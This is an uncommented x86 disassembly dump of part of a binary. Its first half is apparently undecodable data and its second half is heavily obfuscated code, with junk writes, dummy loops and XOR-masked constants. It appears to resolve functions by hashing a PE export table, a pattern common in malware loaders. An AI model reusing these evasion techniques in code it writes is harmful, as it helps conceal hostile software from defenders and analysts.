  408052:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408053:	push   edi
  408054:	inc    ebp
  408055:	(bad)  
  408056:	lahf   
  408057:	stc    
  408058:	and    bl,dh
  40805a:	xchg   DWORD PTR [edi+0x39c8e250],esp
  408060:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408061:	in     eax,0x99
  408063:	jl     0x4080ac
  408065:	stos   BYTE PTR es:[edi],al
  408066:	pop    esi
  408067:	pop    eax
  408068:	mov    bh,0x84
  40806a:	les    esp,FWORD PTR [eax+edx*8-0x76a641cd]
  408071:	test   DWORD PTR [esi-0x57ac5982],ecx
  408077:	(bad)  
  408078:	loope  0x408021
  40807a:	lahf   
  40807b:	or     cl,BYTE PTR [eax+0x5768d566]
  408081:	mov    ah,0x69
  408084:	popf   
  408085:	and    al,0x2f
  408087:	jo     0x408100
  408089:	adc    eax,0xfe45bd19
  40808e:	sub    al,0x67
  408090:	rol    BYTE PTR [edi],1
  408092:	adc    bh,BYTE PTR es:[esi+0x77]
  408096:	(bad)  
  408097:	in     al,dx
  408098:	pop    ebp
  408099:	and    al,0x8a
  40809b:	cdq    
  40809c:	dec    esp
  40809d:	scas   al,BYTE PTR es:[edi]
  40809e:	movq   mm7,mm6
  4080a1:	and    DWORD PTR [edi-0x3],eax
  4080a4:	(bad)  
  4080a5:	scas   eax,DWORD PTR es:[edi]
  4080a6:	jmp    0x5acf2b5c
  4080ab:	int    0xff
  4080ad:	ret    
  4080ae:	outs   dx,BYTE PTR ds:[esi]
  4080af:	mov    al,0x4f
  4080b1:	mov    ch,0x50
  4080b3:	lock lods eax,DWORD PTR ds:[esi]
  4080b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4080b6:	in     eax,0x78
  4080b8:	outs   dx,DWORD PTR ds:[esi]
  4080b9:	xchg   esi,eax
  4080ba:	loop   0x40812f
  4080bc:	or     DWORD PTR [edx],0x38
  4080bf:	mov    WORD PTR [eax+0xa],gs
  4080c2:	leave  
  4080c3:	adc    dh,ch
  4080c5:	bound  edi,QWORD PTR [edi]
  4080c7:	mov    eax,DWORD PTR [edi+0x54e5c084]
  4080cd:	jl     0x4080d9
  4080cf:	adc    dl,BYTE PTR [ebp-0x19c1a891]
  4080d5:	push   eax
  4080d6:	dec    esi
  4080d7:	outs   dx,BYTE PTR ds:[esi]
  4080d8:	in     eax,0x72
  4080da:	fisub  DWORD PTR [edx+0x55e68ec9]
  4080e0:	add    dl,BYTE PTR [ebx+0x6fddcd80]
  4080e6:	xchg   edi,ebp
  4080e8:	lds    esi,FWORD PTR [eax]
  4080ea:	cmp    al,0xe0
  4080ec:	ds push ax
  4080ef:	adc    al,0xf4
  4080f1:	dec    edi
  4080f2:	inc    esi
  4080f3:	cli    
  4080f4:	ss mov bl,0x27
  4080f7:	lods   al,BYTE PTR ds:[esi]
  4080f8:	adc    cl,BYTE PTR [edx+0x1931d318]
  4080fe:	ds arpl sp,dx
  408101:	xchg   ebp,eax
  408102:	push   ebp
  408103:	out    0x27,al
  408105:	sub    al,0xf7
  408107:	inc    esp
  408108:	and    al,0xcb
  40810a:	push   cs
  40810b:	inc    edx
  40810c:	dec    esp
  40810d:	shl    DWORD PTR [esi+edi*8],0xfa
  408111:	jnp    0x40810a
  408113:	cmp    eax,0x9a333ba3
  408118:	push   ds
  408119:	inc    ecx
  40811a:	dec    eax
  40811b:	stos   DWORD PTR es:[edi],eax
  40811c:	cs cmp al,dl
  40811f:	push   ebx
  408120:	push   edi
  408121:	rcl    DWORD PTR ds:0x19d59ad9,0x60
  408128:	hlt    
  408129:	push   cs
  40812a:	hlt    
  40812b:	mov    edx,0x62af9c86
  408130:	cmpxchg BYTE PTR [edi],ah
  408133:	aas    
  408134:	cmp    cl,bh
  408136:	jne    0x4080ba
  408138:	adc    ebx,DWORD PTR [ecx-0x46573855]
  40813e:	adc    BYTE PTR [edi+0x4dfd293a],ch
  408144:	pop    ds
  408145:	dec    ebp
  408146:	inc    di
  408148:	retf   0xb380
  40814b:	cmp    al,bh
  40814d:	sub    esi,DWORD PTR [edi-0x2df1fa67]
  408153:	xchg   esi,eax
  408154:	mov    edx,0xe3f5e801
  408159:	repz adc eax,0x86e151ed
  40815f:	pop    ss
  408160:	jmp    0x5574:0x436f45e3
  408167:	push   eax
  408168:	mov    edx,0x9c1b35f5
  40816d:	das    
  40816e:	retf   0x151f
  408171:	xlat   BYTE PTR ds:[ebx]
  408172:	(bad)  
  408173:	and    eax,esp
  408175:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408176:	sar    BYTE PTR [ecx+0x4e],cl
  408179:	or     al,0x23
  40817b:	xor    esp,DWORD PTR [ebx+0x6d]
  40817e:	jno    0x408119
  408180:	push   ss
  408181:	and    DWORD PTR [ebx-0x6cb0dcb3],ebx
  408187:	mov    ds:0x46cbaca,eax
  40818c:	push   ds
  40818d:	cli    
  40818e:	add    BYTE PTR [edx],ch
  408190:	sub    eax,0x2746653d
  408195:	lea    esi,[edx*2-0x3b2a4ab]
  40819c:	out    0x5c,al
  40819e:	jmp    0x4081e5
  4081a0:	jp     0x4081db
  4081a2:	loope  0x4081f6
  4081a4:	push   ebx
  4081a5:	inc    bp
  4081a7:	cs leave 
  4081a9:	fadd   st(7),st
  4081ab:	and    DWORD PTR [edx],0x89d70cc
  4081b1:	loope  0x408180
  4081b3:	cmp    al,0x75
  4081b5:	ins    DWORD PTR es:[edi],dx
  4081b6:	mov    eax,ds:0xf1de07e3
  4081bb:	fstp   TBYTE PTR [esi+0x16]
  4081be:	retf   0x74fb
  4081c1:	pushf  
  4081c2:	pop    es
  4081c3:	mov    eax,0xe274581
  4081c8:	enter  0x722a,0xfb
  4081cc:	repz fs call 0x78c3:0xbdf2192b
  4081d5:	out    dx,eax
  4081d6:	mov    ch,0x2
  4081d8:	xchg   esp,eax
  4081d9:	jmp    0xcb6c77bb
  4081de:	or     BYTE PTR [ebp+0x21],ch
  4081e1:	aas    
  4081e2:	push   ds
  4081e3:	jae    0x4081bc
  4081e5:	xchg   DWORD PTR [ebx+0x76402f47],edx
  4081eb:	pop    ebx
  4081ec:	or     eax,0xe9dbeb76
  4081f1:	push   ebp
  4081f2:	ins    BYTE PTR es:[edi],dx
  4081f3:	mov    eax,0x5f5a1adb
  4081f8:	inc    edx
  4081f9:	xor    DWORD PTR [ecx-0xf],esp
  4081fc:	pushf  
  4081fd:	jmp    0x4824f371
  408202:	test   BYTE PTR [eax+0x3c9de0fb],ch
  408208:	inc    edx
  408209:	push   ebx
  40820a:	mov    bh,0x2f
  40820c:	adc    ah,cl
  40820e:	(bad)  
  40820f:	sbb    ch,al
  408211:	add    al,0x58
  408213:	call   0x61e7:0x98694b8e
  40821a:	retf   
  40821b:	xchg   esi,eax
  40821c:	addr16 push edi
  40821e:	jo     0x40826a
  408220:	cmp    ebx,0xffffff89
  408223:	mov    esp,DWORD PTR fs:[edi]
  408226:	pop    esp
  408227:	repz mov ebp,edi
  40822a:	push   0x28
  40822c:	aam    0x59
  40822e:	adc    esp,DWORD PTR [edx]
  408230:	repnz push ebx
  408232:	lock inc edx
  408234:	arpl   bx,cx
  408236:	pop    ebx
  408237:	xor    eax,0x6b9e7873
  40823c:	fwait
  40823d:	xchg   dh,al
  40823f:	retf   
  408240:	sub    ah,BYTE PTR [edx+0x4787523c]
  408246:	in     eax,0xb6
  408248:	es loopne 0x408257
  40824b:	scas   al,BYTE PTR es:[edi]
  40824c:	inc    edx
  40824d:	dec    ecx
  40824e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40824f:	loope  0x4081f3
  408251:	mov    esi,0x12a08b90
  408256:	fcom   QWORD PTR ds:0x2f36e2f4
  40825c:	inc    ebx
  40825d:	ret    
  40825e:	add    BYTE PTR ds:[ebx+ebp*8],dl
  408262:	popa   
  408263:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408264:	fst    DWORD PTR [eax+0x14]
  408267:	and    al,0x18
  408269:	popa   
  40826a:	(bad)  
  40826b:	fisttp DWORD PTR [ecx+0x4626bfac]
  408271:	xchg   ebx,eax
  408272:	sbb    bl,BYTE PTR [ebx-0x1f514359]
  408278:	xor    eax,0x6eb9226b
  40827d:	dec    edx
  40827e:	je     0x408276
  408280:	xchg   ebx,eax
  408281:	push   eax
  408282:	popf   
  408283:	xchg   edx,eax
  408284:	adc    eax,0x7f706544
  408289:	xchg   ebx,eax
  40828a:	sahf   
  40828b:	daa    
  40828c:	xchg   ebp,eax
  40828d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40828e:	mov    al,ds:0x199d01ed
  408293:	repz jl 0x408289
  408296:	in     al,0xd6
  408298:	data16 (bad) 
  40829a:	push   edi
  40829b:	sbb    eax,0x3427ad2c
  4082a0:	pushf  
  4082a1:	sbb    al,bl
  4082a3:	fcomi  st,st(1)
  4082a5:	outs   dx,BYTE PTR ds:[esi]
  4082a6:	jecxz  0x408305
  4082a8:	jns    0x40829c
  4082aa:	or     DWORD PTR [esi],0x14
  4082ad:	dec    edx
  4082ae:	pop    edx
  4082af:	ret    
  4082b0:	rol    BYTE PTR ds:0x183e9c19,cl
  4082b6:	mov    ebp,0xe95ea1e0
  4082bc:	js     0x4082b0
  4082be:	call   0x86bcaf4b
  4082c3:	adc    ah,BYTE PTR cs:[ecx+0x8]
  4082c7:	fcomp  QWORD PTR ss:[esi+edx*4+0x66]
  4082cc:	lds    edi,FWORD PTR [edx+0x6b2dc81e]
  4082d2:	jnp    0x4082d6
  4082d4:	inc    ebx
  4082d5:	jmp    0x7d06:0xde50f5b5
  4082dc:	mov    eax,ds:0x286c6345
  4082e1:	sub    eax,0x67d36af0
  4082e6:	push   esp
  4082e7:	fcomp  QWORD PTR ds:0xda98bfc2
  4082ed:	cs add al,0x38
  4082f0:	pop    esi
  4082f1:	push   ds
  4082f2:	out    0xf1,al
  4082f4:	sub    bh,BYTE PTR [edx]
  4082f6:	and    al,0x59
  4082f8:	call   0x3307:0x204b4de9
  4082ff:	cmp    DWORD PTR [ebp+0x71],edx
  408302:	aaa    
  408303:	syscall 
  408305:	neg    BYTE PTR [esp+edi*8-0x61e5255b]
  40830c:	mov    esi,0x51fc9cd5
  408311:	mov    esi,0xc2140a93
  408316:	dec    esp
  408317:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408318:	push   ebx
  408319:	mov    cl,0xe2
  40831b:	xor    edx,DWORD PTR [edx]
  40831d:	test   al,0xa8
  40831f:	or     DWORD PTR [edi],edi
  408321:	mov    bh,BYTE PTR [ebp+ecx*8-0x7]
  408325:	mov    ebp,0xe85f2404
  40832a:	mov    ds:0xf4aad503,al
  40832f:	aad    0x3
  408331:	mov    edx,0xc292443e
  408336:	imul   ebx,DWORD PTR [ebx],0xfffffff9
  408339:	test   DWORD PTR [eax],ebp
  40833b:	enter  0x7796,0x17
  40833f:	and    BYTE PTR [esi],dh
  408341:	in     eax,0xeb
  408343:	and    ch,BYTE PTR [edi+0x6a]
  408346:	jg     0x40833b
  408348:	rcr    BYTE PTR [edx-0x425f00e4],cl
  40834e:	jecxz  0x408316
  408350:	dec    ecx
  408351:	pop    es
  408352:	mov    ds:0x7d6ca05e,eax
  408357:	cmp    DWORD PTR [ebx],eax
  408359:	enter  0x48bd,0x1f
  40835d:	push   edx
  40835e:	cmc    
  40835f:	dec    ebp
  408360:	cmp    ah,0xcf
  408363:	jnp    0x4083a1
  408365:	mov    fs,WORD PTR [ecx]
  408367:	mov    eax,0xaa68e730
  40836c:	in     al,0xa4
  40836e:	pop    edi
  40836f:	push   edx
  408370:	adc    BYTE PTR [edi-0x7b],al
  408373:	mov    ch,0x5b
  408375:	push   0xee835f4d
  40837a:	push   ss
  40837b:	clc    
  40837c:	(bad)  
  40837d:	sti    
  40837e:	or     al,0x54
  408380:	add    BYTE PTR [edx-0x7a],dl
  408383:	test   DWORD PTR [edi],ebp
  408385:	lds    ebx,FWORD PTR [edx-0x379cda31]
  40838b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40838c:	dec    ebp
  40838d:	mov    ds:0xa1fdca3c,eax
  408392:	call   0x9dea3ce
  408397:	shl    DWORD PTR [edi+0x15],cl
  40839a:	nop
  40839b:	mov    ah,0xe1
  40839d:	xor    al,0xca
  40839f:	jl     0x4083f0
  4083a1:	add    eax,0x6c430386
  4083a6:	mov    bh,0x9a
  4083a8:	rol    DWORD PTR [ebx-0x13],cl
  4083ab:	cmp    eax,0xabf8ddc8
  4083b0:	nop
  4083b1:	inc    ebp
  4083b2:	test   ax,0xcc69
  4083b6:	sub    esi,ebx
  4083b8:	ror    DWORD PTR [eax+eiz*1-0x5],1
  4083bc:	add    ebp,DWORD PTR [ebx+0x34]
  4083bf:	adc    al,0xaa
  4083c1:	adc    edx,esp
  4083c3:	neg    BYTE PTR [ebx]
  4083c5:	push   edx
  4083c6:	mov    ah,0x7
  4083c8:	dec    ecx
  4083c9:	push   eax
  4083ca:	jae    0x4083b5
  4083cc:	pop    ebx
  4083cd:	jne    0x4083b8
  4083cf:	mov    ebp,0xcbae5cc
  4083d4:	fabs   
  4083d6:	jmp    0x40841f
  4083d8:	mov    esi,0x1702e0f1
  4083dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4083de:	pushf  
  4083df:	stos   DWORD PTR es:[edi],eax
  4083e0:	fnstcw WORD PTR [eax*1-0x6c9ba692]
  4083e7:	mov    ds:0xcc454eba,eax
  4083ec:	xor    ebp,esp
  4083ee:	mov    dl,0x4f
  4083f0:	inc    ebx
  4083f1:	push   esp
  4083f2:	(bad)  
  4083f3:	in     al,0x1d
  4083f5:	mov    ebx,0x75da0acc
  4083fa:	push   0x4
  4083fc:	gs jmp 0xbd3f:0xce596d21
  408404:	out    dx,al
  408405:	je     0x408438
  408407:	inc    ecx
  408408:	ins    DWORD PTR es:[edi],dx
  408409:	xlat   BYTE PTR ds:[ebx]
  40840a:	daa    
  40840b:	leave  
  40840c:	cmp    DWORD PTR [ebx-0x13],esi
  40840f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408410:	push   eax
  408411:	imul   esp,ecx,0x6a386635
  408417:	xchg   esi,eax
  408419:	mov    ebx,0xdcff0b53
  40841e:	mov    bl,0xe3
  408420:	inc    ebx
  408421:	je     0x4083af
  408423:	mul    edi
  408425:	inc    ecx
  408426:	fidiv  WORD PTR [edx]
  408428:	push   ds
  408429:	pop    esi
  40842a:	adc    ah,BYTE PTR [eax+0x5c]
  40842d:	xchg   edi,eax
  40842e:	pop    ss
  40842f:	and    al,0x8d
  408431:	mov    ch,0xbe
  408433:	aad    0xc4
  408435:	lahf   
  408436:	xchg   esp,eax
  408437:	arpl   bp,bx
  408439:	and    edi,DWORD PTR [ebx*8-0x41f6cab5]
  408440:	push   ebp
  408441:	leave  
  408442:	sbb    bl,BYTE PTR [esi-0x36]
  408445:	push   esi
  408446:	cmp    BYTE PTR [ebx],bl
  408448:	pop    eax
  408449:	sbb    dh,cl
  40844b:	xchg   al,dl
  40844d:	push   ecx
  40844e:	push   cs
  40844f:	inc    edi
  408450:	int3   
  408451:	push   edi
  408452:	jmp    0xa587c23e
  408457:	and    eax,0xd732371c
  40845c:	add    ah,ch
  40845e:	xor    ecx,ebp
  408460:	ins    BYTE PTR es:[edi],dx
  408461:	mov    bx,WORD PTR [ebp-0x8]
  408465:	mov    BYTE PTR [edx+ebx*1],al
  408468:	mov    eax,DWORD PTR [ebp-0x40]
  40846b:	mov    edx,DWORD PTR [ebp-0x28]
  40846e:	xor    eax,esi
  408470:	xor    edx,esi
  408472:	add    eax,edi
  408474:	add    edx,edi
  408476:	imul   eax,edx
  408479:	add    eax,DWORD PTR [ebp-0xc]
  40847c:	mov    DWORD PTR [ebp-0xc],eax
  40847f:	mov    eax,DWORD PTR [ebp-0xc]
  408482:	mov    edx,DWORD PTR [ebp-0x18]
  408485:	cmp    edx,eax
  408487:	jb     0x403cec
  40848d:	mov    eax,DWORD PTR [ebp-0x28]
  408490:	mov    edx,DWORD PTR [ebp-0x18]
  408493:	xor    eax,esi
  408495:	add    eax,edi
  408497:	imul   eax,edx
  40849a:	mov    edx,DWORD PTR [ebp-0x1c]
  40849d:	xor    edx,esi
  40849f:	add    edx,edi
  4084a1:	or     eax,edx
  4084a3:	mov    edx,DWORD PTR [ebp-0x20]
  4084a6:	xor    edx,esi
  4084a8:	add    eax,edx
  4084aa:	mov    edx,DWORD PTR [ebp-0x20]
  4084ad:	xor    edx,esi
  4084af:	add    eax,edx
  4084b1:	mov    edx,DWORD PTR [ebp-0x10]
  4084b4:	lea    eax,[eax+edx*1+0x64e5f0]
  4084bb:	jmp    0x4084cf
  4084c0:	mov    eax,DWORD PTR [ebp-0x20]
  4084c3:	mov    edx,DWORD PTR [ebp-0x10]
  4084c6:	xor    eax,esi
  4084c8:	lea    eax,[eax+edx*1+0x3272f8]
  4084cf:	mov    DWORD PTR [ebp-0x10],eax
  4084d2:	jmp    0x403c39
  4084d7:	mov    ebx,DWORD PTR [ebp-0x3c]
  4084da:	mov    eax,DWORD PTR [ebp+0xc]
  4084dd:	xor    eax,esi
  4084df:	lea    ecx,[ecx+eax*1+0x3272f8]
  4084e6:	lea    eax,[ecx-0x3272f8]
  4084ec:	xor    eax,esi
  4084ee:	cmp    eax,0xf89c95b9
  4084f3:	jne    0x403bdd
  4084f9:	dec    DWORD PTR [ebp-0x34]
  4084fc:	jne    0x403bd1
  408502:	mov    eax,DWORD PTR [ebp+0x8]
  408505:	mov    ecx,DWORD PTR [ebp+0xc]
  408508:	mov    edx,DWORD PTR [ebp+0x8]
  40850b:	xor    ecx,esi
  40850d:	mov    cl,BYTE PTR [ecx+ebx*1+0x3272f8]
  408514:	xor    eax,esi
  408516:	mov    al,BYTE PTR [eax+ebx*1+0x3272f8]
  40851d:	xor    edx,esi
  40851f:	mov    BYTE PTR [edx+ebx*1+0x3272f8],cl
  408526:	mov    ecx,DWORD PTR [ebp+0xc]
  408529:	xor    ecx,esi
  40852b:	mov    BYTE PTR [ecx+ebx*1+0x3272f8],al
  408532:	mov    eax,DWORD PTR [ebp+0xc]
  408535:	xor    eax,esi
  408537:	add    eax,edi
  408539:	pop    edi
  40853a:	pop    esi
  40853b:	pop    ebx
  40853c:	leave  
  40853d:	ret    0x8
  408540:	sbb    DWORD PTR ds:0x428ec1,0x6a44
  40854a:	xor    eax,eax
  40854c:	ret    
  40854d:	push   ebp
  40854e:	mov    ebp,esp
  408550:	sub    esp,0x38
  408553:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  40855a:	adc    DWORD PTR ds:0x428ead,0x214
  408564:	push   ebx
  408565:	sbb    DWORD PTR ds:0x428e39,0x495a
  40856f:	mov    DWORD PTR [ebp-0xc],0xf89c85b8
  408576:	add    DWORD PTR ds:0x428ea9,0x428e91
  408580:	mov    eax,DWORD PTR [ebp-0x4]
  408583:	sub    DWORD PTR ds:0x428ea5,0x68fd
  40858d:	push   esi
  40858e:	sub    DWORD PTR ds:0x428e6d,ebx
  408594:	mov    esi,0x75108b1
  408599:	xor    eax,esi
  40859b:	adc    DWORD PTR ds:0x428e95,0x428e2d
  4085a5:	push   edi
  4085a6:	mov    edi,0x3272f8
  4085ab:	sub    DWORD PTR ds:0x428ecd,0x5e85
  4085b5:	add    eax,edi
  4085b7:	sub    DWORD PTR ds:0x428eb5,0x428e59
  4085c1:	mov    DWORD PTR [ebp-0x1c],eax
  4085c4:	mov    eax,DWORD PTR [ebp+0x14]
  4085c7:	test   eax,eax
  4085c9:	je     0x408625
  4085cf:	and    DWORD PTR ds:0x428e41,0x0
  4085d9:	mov    eax,ds:0x428e41
  4085de:	inc    eax
  4085df:	mov    ds:0x428e41,eax
  4085e4:	cmp    DWORD PTR ds:0x428e41,0x1c
  4085eb:	jl     0x408613
  4085f1:	jmp    0x408606
  4085f6:	push   0x428073
  4085fb:	push   0x400000
  408600:	call   DWORD PTR ds:0x42ca24
  408606:	cmp    DWORD PTR ds:0x428e41,0x13
  40860d:	jb     0x4085d9
  408613:	mov    eax,DWORD PTR [ebp+0x14]
  408616:	sbb    DWORD PTR ds:0x428e25,0x208f
  408620:	mov    eax,DWORD PTR [eax]
  408622:	mov    DWORD PTR [ebp-0x1c],eax
  408625:	and    DWORD PTR ds:0x428e4d,edx
  40862b:	mov    eax,DWORD PTR [ebp-0x4]
  40862e:	xor    eax,esi
  408630:	add    eax,edi
  408632:	movzx  ebx,BYTE PTR ds:0x428e6d
  408639:	sub    DWORD PTR ds:0x428eb5,ebx
  40863f:	mov    DWORD PTR [ebp-0x8],eax
  408642:	mov    ebx,DWORD PTR ds:0x428e45
  408648:	sub    DWORD PTR ds:0x428ead,ebx
  40864e:	mov    eax,DWORD PTR [ebp-0xc]
  408651:	xor    eax,esi
  408653:	or     DWORD PTR ds:0x428e25,0x7ae1
  40865d:	add    eax,edi
  40865f:	mov    DWORD PTR [ebp-0x24],eax
  408662:	mov    DWORD PTR ds:0x428eb5,0x1d
  40866c:	cmp    DWORD PTR ds:0x428eb5,0x0
  408673:	je     0x4086a6
  408679:	cmp    DWORD PTR ds:0x428eb5,0x22
  408680:	jb     0x4086a6
  408686:	jmp    0x408696
  40868b:	push   0x35a8
  408690:	call   DWORD PTR ds:0x42ca28
  408696:	mov    eax,ds:0x428eb5
  40869b:	dec    eax
  40869c:	mov    ds:0x428eb5,eax
  4086a1:	jmp    0x40866c
  4086a6:	mov    eax,DWORD PTR [ebp-0x4]
  4086a9:	xor    eax,esi
  4086ab:	sub    ebx,DWORD PTR ds:0x428e35
  4086b1:	add    eax,edi
  4086b3:	mov    DWORD PTR [ebp-0x30],eax
  4086b6:	sbb    eax,0x56d4
  4086bb:	mov    ebx,DWORD PTR [ebp-0x4]
  4086be:	sub    DWORD PTR ds:0x428e55,edi
  4086c4:	xor    ebx,esi
  4086c6:	mov    DWORD PTR ds:0x428e8d,0xdd6
  4086d0:	add    ebx,edi
  4086d2:	mov    eax,DWORD PTR [ebp-0x24]
  4086d5:	sub    eax,edi
  4086d7:	xor    DWORD PTR ds:0x428e2d,0x506a
  4086e1:	lea    ecx,[ebx-0x3272f8]
  4086e7:	or     DWORD PTR ds:0x428e31,0x428e75
  4086f1:	xor    eax,esi
  4086f3:	or     DWORD PTR ds:0x428e41,0x428e89
  4086fd:	xor    ecx,esi
  4086ff:	mov    DWORD PTR ds:0x428e71,0xf9c
  408709:	cmp    ecx,eax
  40870b:	je     0x408990
  408711:	mov    eax,DWORD PTR [ebp-0x4]
  408714:	add    DWORD PTR ds:0x428e99,0x428e29
  40871e:	xor    eax,esi
  408720:	sbb    DWORD PTR ds:0x428ead,0x428e4d
  40872a:	add    eax,edi
  40872c:	cmp    ebx,eax
  40872e:	jne    0x408947
  408734:	push   DWORD PTR [ebp+0x8]
  408737:	call   0x423f19
  40873c:	and    DWORD PTR ds:0x428ea1,0x3c45
  408746:	mov    DWORD PTR [ebp-0x14],eax
  408749:	and    DWORD PTR ds:0x428e89,0x0
  408753:	mov    eax,ds:0x428e89
  408758:	inc    eax
  408759:	mov    ds:0x428e89,eax
  40875e:	cmp    DWORD PTR ds:0x428e89,0x23
  408765:	ja     0x408786
  40876b:	jmp    0x408779
  408770:	push   DWORD PTR [ebp-0x24]
  408773:	call   DWORD PTR ds:0x42ca2c
  408779:	cmp    DWORD PTR ds:0x428e89,0x15
  408780:	jb     0x408753
  408786:	mov    eax,DWORD PTR [ebp-0x4]
  408789:	mov    ecx,DWORD PTR [ebp-0x14]
  40878c:	sbb    DWORD PTR ds:0x428e71,0x428e81
  408796:	xor    eax,esi
  408798:	and    DWORD PTR ds:0x428e4d,0x12fb
  4087a2:	add    eax,edi
  4087a4:	cmp    ecx,eax
  4087a6:	mov    DWORD PTR ds:0x428e69,0x743f
  4087b0:	je     0x408a8e
  4087b6:	xor    DWORD PTR ds:0x428e7d,0x5052
  4087c0:	push   DWORD PTR [ebp-0x14]
  4087c3:	push   DWORD PTR [ebp+0x8]
  4087c6:	xor    DWORD PTR ds:0x428ea5,0x6996
  4087d0:	call   0x423fff
  4087d5:	mov    DWORD PTR [ebp-0x14],eax
  4087d8:	mov    eax,DWORD PTR [ebp-0x4]
  4087db:	sub    DWORD PTR ds:0x428e4d,edi
  4087e1:	mov    ecx,DWORD PTR [ebp-0x14]
  4087e4:	sbb    DWORD PTR ds:0x428e35,0x169a
  4087ee:	xor    eax,esi
  4087f0:	sbb    DWORD PTR ds:0x428e31,0x428ebd
  4087fa:	add    eax,edi
  4087fc:	mov    DWORD PTR ds:0x428e99,0xb5
  408806:	cmp    ecx,eax
  408808:	mov    DWORD PTR ds:0x428ebd,0x5868
  408812:	je     0x408a8e
  408818:	mov    DWORD PTR ds:0x428e41,0x51a7
  408822:	mov    eax,DWORD PTR [ebp-0x14]
  408825:	mov    eax,DWORD PTR [eax+0x18]
  408828:	adc    ecx,DWORD PTR ds:0x428e71
  40882e:	mov    DWORD PTR [ebp-0x24],eax
  408831:	and    DWORD PTR ds:0x428e95,0x0
  40883b:	jmp    0x40884d
  408840:	mov    ecx,DWORD PTR ds:0x428e95
  408846:	inc    ecx
  408847:	mov    DWORD PTR ds:0x428e95,ecx
  40884d:	cmp    DWORD PTR ds:0x428e95,0x1a
  408854:	jae    0x408896
  40885a:	cmp    DWORD PTR ds:0x428e95,0xd
  408861:	jge    0x408896
  408867:	jmp    0x408877
  40886c:	push   0x428043
  408871:	call   DWORD PTR ds:0x42ca30
  408877:	cmp    DWORD PTR ds:0x428e95,0xc
  40887e:	jne    0x408891
  408884:	mov    ecx,DWORD PTR ds:0x428e95
  40888a:	inc    ecx
  40888b:	mov    DWORD PTR ds:0x428e95,ecx
  408891:	jmp    0x408840
  408896:	mov    eax,DWORD PTR [ebp-0x14]
  408899:	dec    DWORD PTR ds:0x428ea9
  40889f:	mov    ecx,DWORD PTR [ebp+0x8]
  4088a2:	add    DWORD PTR ds:0x428e71,0x6a43
  4088ac:	add    ecx,DWORD PTR [eax+0x20]
  4088af:	mov    DWORD PTR ds:0x428e95,0x1e
  4088b9:	cmp    DWORD PTR ds:0x428e95,0x0
  4088c0:	je     0x40890b
  4088c6:	cmp    DWORD PTR ds:0x428e95,0xd
  4088cd:	jl     0x40890b
  4088d3:	jmp    0x4088e3
  4088d8:	push   0x635d
  4088dd:	call   DWORD PTR ds:0x42ca38
  4088e3:	cmp    DWORD PTR ds:0x428e95,0xe
  4088ea:	jne    0x4088fb
  4088f0:	mov    eax,ds:0x428e95
  4088f5:	dec    eax
  4088f6:	mov    ds:0x428e95,eax
  4088fb:	mov    eax,ds:0x428e95
  408900:	dec    eax
  408901:	mov    ds:0x428e95,eax
  408906:	jmp    0x4088b9
  40890b:	mov    DWORD PTR [ebp-0x2c],ecx
  40890e:	mov    eax,DWORD PTR [ebp-0x14]
  408911:	mov    ecx,DWORD PTR [ebp+0x8]
  408914:	add    DWORD PTR ds:0x428e75,0x428ed1
  40891e:	add    ecx,DWORD PTR [eax+0x24]
  408921:	or     DWORD PTR ds:0x428e3d,edi
  408927:	mov    DWORD PTR [ebp-0x34],ecx
  40892a:	sbb    ecx,ecx
  40892c:	mov    eax,DWORD PTR [ebp-0x14]
  40892f:	mov    ecx,DWORD PTR [ebp+0x8]
  408932:	add    ecx,DWORD PTR [eax+0x1c]
  408935:	mov    DWORD PTR ds:0x428e9d,0x2455
  40893f:	mov    DWORD PTR [ebp-0x14],ecx
  408942:	jmp    0x408a15
  408947:	add    eax,DWORD PTR ds:0x428e65
  40894d:	mov    eax,DWORD PTR [ebp-0x2c]
  408950:	mov    ecx,DWORD PTR [ebp+0x8]
  408953:	add    ecx,DWORD PTR [eax+ebx*4]
  408956:	mov    DWORD PTR [ebp-0x28],ecx
  408959:	mov    ecx,DWORD PTR ds:0x428ea5
  40895f:	and    DWORD PTR ds:0x428e31,ecx
  408965:	mov    eax,DWORD PTR [ebp-0x4]
  408968:	mov    ecx,DWORD PTR [ebp-0x28]
  40896b:	xor    eax,esi
  40896d:	sub    DWORD PTR ds:0x428ebd,0x6f28
  408977:	add    eax,edi
  408979:	cmp    ecx,eax
  40897b:	mov    DWORD PTR ds:0x428ea9,0x5189
  408985:	je     0x408a15
  40898b:	jmp    0x4089f2
  408990:	mov    eax,DWORD PTR [ebp-0x4]
  408993:	and    ecx,DWORD PTR ds:0x428e65
  408999:	mov    ecx,DWORD PTR [ebp-0x8]
  40899c:	xor    eax,esi
  40899e:	dec    DWORD PTR ds:0x428e8d
  4089a4:	add    eax,edi
  4089a6:	mov    DWORD PTR ds:0x428e99,0x7af8
  4089b0:	cmp    ecx,eax
  4089b2:	mov    eax,DWORD PTR [ebp-0x4]
  4089b5:	mov    DWORD PTR ds:0x428e4d,0x614e
  4089bf:	je     0x408a91
  4089c5:	and    DWORD PTR ds:0x428e79,0x1e6e
  4089cf:	mov    ecx,DWORD PTR [ebp-0x30]
  4089d2:	xor    eax,esi
  4089d4:	add    eax,edi
  4089d6:	mov    DWORD PTR ds:0x428ecd,0x6155
  4089e0:	cmp    ecx,eax
  4089e2:	mov    DWORD PTR ds:0x428e41,0x6810
  4089ec:	je     0x408a9a
  4089f2:	lea    eax,[ebp-0x8]
  4089f5:	xor    DWORD PTR ds:0x428ec1,0x428e25
  4089ff:	push   eax
  408a00:	push   DWORD PTR [ebp-0x28]
  408a03:	sbb    DWORD PTR ds:0x428e71,0x1b8d
  408a0d:	push   DWORD PTR [ebp+0xc]
  408a10:	call   0x40f741
  408a15:	or     DWORD PTR ds:0x428e9d,edx
  408a1b:	mov    eax,DWORD PTR [ebp-0x4]
  408a1e:	sbb    DWORD PTR ds:0x428e5d,edx
